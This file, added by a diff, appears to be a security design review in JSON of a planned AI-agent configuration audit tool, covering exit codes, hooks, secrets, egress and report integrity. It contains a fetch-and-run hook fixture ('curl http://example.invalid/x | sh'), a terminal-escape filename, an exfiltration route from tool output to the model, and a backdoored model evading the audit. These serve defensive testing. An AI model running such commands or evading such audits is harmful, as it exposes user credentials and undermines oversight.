@@ -1,0 +1,252 @@
+{
+  "task": "t_381dbe8e",
+  "scope": [
+    "design/agent-guard-plan.md",
+    "findings/agent-guard/article-notes.md",
+    "aurascan/core/agent.py",
+    "aurascan/core/agent_config.py",
+    "aurascan/core/instruction_guard.py",
+    "aurascan/mcp/tools/audit_agent_config.py",
+    "aurascan/mcp/registry.py",
+    "aurascan/mcp/guards.py",
+    "aurascan/mcp/__main__.py",
+    "docs/SECURITY_BOUNDARIES.md",
+    "desktop/electron/main.cjs",
+    "desktop/electron/argv.cjs",
+    "desktop/src/contract.ts",
+    "tests/test_instruction_guard.py"
+  ],
+  "coverage": {
+    "files_total": 14,
+    "files_checked": 14,
+    "note": "Design review of the plan; large files (agent.py, instruction_guard.py) were checked at the cited policy/discovery/hook/MCP/config regions, not line-by-line."
+  },
+  "findings": [
+    {
+      "id": "B1",
+      "verdict": "confirmed",
+      "severity": "critical",
+      "location": "design/agent-guard-plan.md:152",
+      "source": "exit code 0 is defined as 'audit completed and no HIGH finding'",
+      "sink": "AGENT-RUNTIME-CONFIG-INCOMPLETE-001 is MEDIUM (plan:118), and exit 3 is only 'audit could not complete' (plan:155-156)",
+      "missing_check": "no mapping from incomplete coverage to a non-zero exit; 0 is reachable with an unparsed recognized surface",
+      "impact": "a user or CI reads exit 0 as a pass while the unparsed config could be the one granting shell authority",
+      "repro": "fixture: Claude settings with an unsupported key + a clean Codex surface; assert exit 3, current contract produces 0",
+      "regression_test": "test_exit_code_incomplete_coverage_is_three"
+    },
+    {
+      "id": "H1",
+      "verdict": "needs_validation",
+      "location": "design/agent-guard-plan.md:115",
+      "source": "rule keys on an exposed shell/exec tool or an unusable approval setting",
+      "sink": "agent configs are deltas over built-in toolsets; an empty config does not mean no shell",
+      "missing_check": "no per-agent, versioned default-toolset/default-approval table; 'not mentioned' is treated as absent",
+      "impact": "a default shell is missed and the audit exits 0",
+      "repro": "fixture: empty Claude/Codex config for an agent whose default toolset includes a shell; assert non-zero or coverage failure"
+    },
+    {
+      "id": "H2",
+      "verdict": "confirmed",
+      "severity": "high",
+      "location": "design/agent-guard-plan.md:110",
+      "source": "rule table has no hook-command or MCP-stdio-command rule; policy says it evaluates config facts, not command strings (plan:248-250)",
+      "sink": "hooks execute automatically and MCP stdio commands run at startup without a model tool call; existing instruction_guard already flags hooks (instruction_guard.py:3621-3643, 3798-3816) and analyzes Cursor MCP commands (4156-4190)",
+      "missing_check": "execution authority is not derived from presence of hook commands or MCP command fields",
+      "impact": "a project hook or MCP server executes while agent-audit reports no shell authority and exits 0, contradicting an Instruction Guard HIGH",
+      "repro": "fixture: .claude/settings.json with Bash denied plus a SessionStart hook 'curl http://example.invalid/x | sh'; assert an execution-authority finding",
+      "regression_test": "test_hook_and_mcp_command_are_execution_authority"
+    },
+    {
+      "id": "H3",
+      "verdict": "confirmed",
+      "severity": "high",
+      "location": "design/agent-guard-plan.md:226",
+      "source": "discovery lists user and project config layers without precedence",
+      "sink": "a project settings.local.json or project MCP manifest can grant what the user config denies",
+      "missing_check": "no per-agent layer order, merge rule, or unknown-precedence coverage state",
+      "impact": "clean user config is reported while the effective project config enables shell/MCP execution",
+      "repro": "fixture: user settings deny Bash; project settings.local.json allow Bash(*); assert execution authority or coverage failure",
+      "regression_test": "test_project_layer_overrides_user_layer"
+    },
+    {
+      "id": "H4",
+      "verdict": "confirmed",
+      "severity": "high",
+      "location": "design/agent-guard-plan.md:116",
+      "source": "secret classes are .env*, SSH, cloud credential files, AuraScan .env and 'another recognized secret store'",
+      "sink": "same-UID shell can read environment variables, agent auth stores, VCS/package credentials, sockets and absolute paths outside --root",
+      "missing_check": "no env/socket/auth-store/VCS-credential classes; reachability scoped to cwd/home rather than UID-readable",
+      "impact": "the audit reports no secret class while the model reads env and exfiltrates, so the aggregate never fires",
+      "repro": "fixture: launch an agent with ANTHROPIC_API_KEY/AWS_SECRET_ACCESS_KEY in env and no .env file; assert an env secret class",
+      "regression_test": "test_environment_and_agent_auth_store_are_secret_classes"
+    },
+    {
+      "id": "H5",
+      "verdict": "confirmed",
+      "severity": "high",
+      "location": "design/agent-guard-plan.md:117",
+      "source": "egress is 'unrestricted' or ambiguous, and policy includes sandbox/egress claims and approval modes (plan:246)",
+      "sink": "config claims and an approval prompt are not OS boundaries; a shell on a normal host has network by default",
+      "missing_check": "no host-relative isolation fact; config claims are treated as proof and ambiguity as a HIGH detection",
+      "impact": "a config that says sandbox/egress-restricted or approval 'ask' is reported as safe while the agent still has a host shell and network",
+      "repro": "fixture: config declares network:false and approval:ask with a shell tool; assert host capability 'none/unknown', not egress-denied",
+      "regression_test": "test_config_egress_claim_is_not_isolation"
+    },
+    {
+      "id": "H6",
+      "verdict": "confirmed",
+      "severity": "high",
+      "location": "design/agent-guard-plan.md:116",
+      "source": ".env* matches .env.example/.template/sample; ~/.ssh, keyrings and browser stores are ubiquitous",
+      "sink": "aggregate rule 119 fires on an ordinary developer machine with a shell tool",
+      "missing_check": "no separation between inventory (MEDIUM/INFO) and capability (HIGH); no example/template exclusion",
+      "impact": "HIGH loses discrimination and users learn to ignore the aggregate; the article-shaped case is indistinguishable",
+      "repro": "fixture: clean checkout with .env.example and a default ~/.ssh; assert the aggregate is not a HIGH malware-style finding",
+      "regression_test": "test_ordinary_developer_baseline_is_not_high"
+    },
+    {
+      "id": "H7",
+      "verdict": "confirmed",
+      "severity": "high",
+      "location": "design/agent-guard-plan.md:265",
+      "source": "remote model reference is checked as a URL and trust state, not fetched; report digest only",
+      "sink": "config files and the model endpoint can change after the audit; no captured_at or input digest",
+      "missing_check": "no per-input digest (path/dev/ino/size/mtime/sha256), no freshness field, no revalidate-before-run requirement",
+      "impact": "a clean audit continues to be displayed after a branch switch or payload swap enables the attack",
+      "repro": "fixture: audit a clean config, rewrite the project settings, assert the report is stale/refused before launch",
+      "regression_test": "test_report_is_stale_when_input_digest_changes"
+    },
+    {
+      "id": "H8",
+      "verdict": "confirmed",
+      "severity": "high",
+      "location": "design/agent-guard-plan.md:114",
+      "source": "model is UNVERIFIED unless a local trust entry exists",
+      "sink": "a user-created trust entry suppresses the provenance finding; a pinned hash proves identity at audit time, not safety",
+      "missing_check": "trust entry is treated as verification and is allowed to remove the finding",
+      "impact": "user approves an endpoint once; operator swaps the model; audit reports no model finding and exit 0 is read as verified",
+      "repro": "fixture: add a trust entry for a remote URL, change the referenced adapter, assert the provenance finding remains",
+      "regression_test": "test_trust_entry_never_verifies_a_model"
+    },
+    {
+      "id": "H9",
+      "verdict": "needs_validation",
+      "location": "design/agent-guard-plan.md:124",
+      "source": "Slice B gives the shell a netns with no egress but routes model traffic through an audited proxy while the agent executes tools",
+      "sink": "tool output is sent to the model in the next request; the mounted project includes .env and .git/hooks",
+      "missing_check": "no broker outside the sandbox, no DLP/redaction of tool results, no secret-file exclusion from the rw mount",
+      "impact": "cat .env -> tool result -> model request exfiltrates with no shell socket; the shell-netns claim is true but the credential-theft claim is false",
+      "repro": "probe: shell writes a sentinel to stdout; assert whether it reaches the model/proxy request; H9 expects it does unless the proxy blocks it"
+    },
+    {
+      "id": "H10",
+      "verdict": "needs_validation",
+      "location": "design/agent-guard-plan.md:164",
+      "source": "audit_agent_runtime is exposed over MCP and adoption says 'MCP for agents' (plan:313-314)",
+      "sink": "the audited agent receives the same report, including inspected surfaces and coverage gaps",
+      "missing_check": "no operator-only gate, no aggregate-only projection, no rate/boundary restriction for the audited party",
+      "impact": "a backdoored model uses the report as an evasion map or learns which paths/classes are not inspected",
+      "repro": "design probe: call the tool from the agent-facing MCP session; assert it is unavailable or returns no paths/surfaces"
+    },
+    {
+      "id": "M1",
+      "verdict": "needs_validation",
+      "location": "design/agent-guard-plan.md:184",
+      "source": "Harden action 'opens the exact terminal command with the proposed agent-guard profile' and validates an undefined root token",
+      "sink": "a terminal launch is an execution surface; a report-derived root or a 'profile' that starts Slice B crosses the read-only boundary",
+      "missing_check": "no fixed-argv/no-shell requirement, no opaque main-issued root token definition, no Slice A 'copy only' rule",
+      "impact": "a metacharacter/control-character path can execute an extra command from a button labeled Harden, or Slice A starts the agent",
+      "repro": "fixture: project path containing ';' or a newline; assert the action never constructs a shell string and never runs agent-guard run"
+    },
+    {
+      "id": "M2",
+      "verdict": "confirmed",
+      "severity": "medium",
+      "location": "design/agent-guard-plan.md:233",
+      "source": "parsers are bounded but discovery traversal has no entry/depth/time bounds",
+      "sink": "the existing guard resolve_regular_file rejects directories (guards.py:43-77); a new walker is required",
+      "missing_check": "no bounded directory walker (entries/depth/time/prune) and no explicit coverage on truncation",
+      "impact": "large home/node_modules walks stall the desktop action; partial walks can be reported as complete; symlink/rename races can escape the root",
+      "repro": "fixture: --root a tree with 100k entries and a symlink swap; assert bounded, explicit coverage and no out-of-root read",
+      "regression_test": "test_discovery_is_bounded_and_fails_closed_on_race"
+    },
+    {
+      "id": "M3",
+      "verdict": "confirmed",
+      "severity": "medium",
+      "location": "design/agent-guard-plan.md:271",
+      "source": "report digest is computed by the same unprivileged code and the desktop refuses a changed report",
+      "sink": "a same-UID writer can rewrite the report and recompute the digest",
+      "missing_check": "no distinction between corruption detection and tamper protection; no key outside the UID's reach",
+      "impact": "the plan's 'report integrity' reads as tamper-proof but is defeated by the same-UID attacker it already acknowledges",
+      "repro": "fixture: rewrite a clean report and recompute the digest; assert the doc calls it consistency-only and does not claim tamper protection",
+      "regression_test": "test_report_integrity_is_consistency_only"
+    },
+    {
+      "id": "M4",
+      "verdict": "needs_validation",
+      "location": "design/agent-guard-plan.md:104",
+      "source": "sanitized path and one-based line range in the report",
+      "sink": "paths, MCP server names and tool names are attacker-controlled and can contain newlines/ANSI/control characters",
+      "missing_check": "sanitization is undefined; the existing agent.py:1963 sanitizer is not required",
+      "impact": "terminal title/OSC injection or a forged report line when the human view prints a hostile filename",
+      "repro": "fixture: filename '\\x1b]0;owned\\x07.env'; assert no ESC/control bytes reach the human renderer"
+    },
+    {
+      "id": "M5",
+      "verdict": "confirmed",
+      "severity": "medium",
+      "location": "design/agent-guard-plan.md:96",
+      "source": "--model accepts a local directory/file or HTTP(S) endpoint; report redacts raw model paths",
+      "sink": "local directory hashing is unbounded; URL userinfo/query/fragment is not specified for redaction",
+      "missing_check": "no byte cap for model metadata, no URL userinfo rejection or query/fragment stripping",
+      "impact": "40GB model tree stalls the audit; https://user:token@host/model?key=... leaks credentials into a persisted report",
+      "repro": "fixture: model URL with userinfo/query and a large model directory; assert no credential component is persisted and the read is capped",
+      "regression_test": "test_model_reference_bounds_and_url_redaction"
+    },
+    {
+      "id": "M6",
+      "verdict": "confirmed",
+      "severity": "medium",
+      "location": "design/agent-guard-plan.md:277",
+      "source": "ten proposed tests",
+      "sink": "no test for incomplete-surface exit code, defaults, precedence, hooks/MCP commands, env secrets, large/rooted trees, MCP oracle, terminal injection, 'no HIGH != safe' wording, post-audit config change, or model URL components",
+      "missing_check": "the test plan does not falsify the load-bearing claims",
+      "impact": "the suite can pass while B1-H10 ship",
+      "repro": "add the named regressions in red-findings/report M6; run the table-driven exit-code matrix",
+      "regression_test": "test_agent_audit_contract_matrix"
+    },
+    {
+      "id": "L1",
+      "verdict": "confirmed",
+      "severity": "low",
+      "location": "design/agent-guard-plan.md:38",
+      "source": "plan says instruction_guard does not inspect an agent's shell/exec configuration and that the audit reduces reachability",
+      "sink": "instruction_guard.py:1577-1612 classifies settings/manifests, 3621-3643/3798-3816 flags hooks, 4156-4190 analyzes MCP commands, 2533-2540 flags project shell enablement",
+      "missing_check": "the plan does not state the relationship to existing Instruction Guard coverage; 'reduces reachability' is not what an audit does",
+      "impact": "understates existing coverage, predicts rule contradiction, and overstates the audit's effect",
+      "repro": "grep the cited regions; run an existing hook fixture through both analyses and compare rule IDs/severity",
+      "regression_test": "test_agent_audit_agrees_with_instruction_guard_on_hooks"
+    },
+    {
+      "id": "I1",
+      "verdict": "needs_validation",
+      "location": "design/agent-guard-plan.md:124",
+      "source": "article lesson: separate network from execution, sandbox both, log crossings, do not rely on domain allowlists (article-notes.md:21-24)",
+      "sink": "Slice B gives the shell a netns but the agent holds model egress and tool execution; the tool-output->model crossing is not logged; the model trust entry is an allowlist",
+      "missing_check": "the four lessons are prose, not acceptance criteria",
+      "impact": "the plan appears to absorb the lesson while reproducing two of its failure modes"
+    }
+  ],
+  "cleared": [
+    {"location": "design/agent-guard-plan.md:70", "reason": "model-weight scanning is explicitly a non-goal; no trigger-detection claim"},
+    {"location": "design/agent-guard-plan.md:98", "reason": "Slice A never executes configs, agents, MCP servers or models; consistent across the plan"},
+    {"location": "design/agent-guard-plan.md:263", "reason": "no secret values in output is the right requirement; the gap is path sanitization and class coverage, not value handling"},
+    {"location": "design/agent-guard-plan.md:269", "reason": "same-UID limitation is stated honestly; it limits M3's integrity claim, not the audit's premise"},
+    {"location": "docs/SECURITY_BOUNDARIES.md:150", "reason": "AUR chroot is correctly described as sharing the host kernel, not a general sandbox"},
+    {"location": "design/agent-guard-plan.md:309", "reason": "Slice B is cleanly separated for funding, except for the Harden wording (M1)"},
+    {"location": "aurascan/mcp/guards.py:43", "reason": "resolve_regular_file/read_capped is a sound identity-bound, no-follow, size-capped primitive to reuse for file reads"},
+    {"location": "instruction_guard.py:3911", "reason": "the existing JSON reader rejects duplicate/ambiguous keys; the plan's duplicate-key test is achievable by reuse"},
+    {"location": "instruction_guard.py:3798", "reason": "hooks and MCP command behavior are already analyzed; agent-audit should reuse or defer, not contradict"}
+  ]
+}
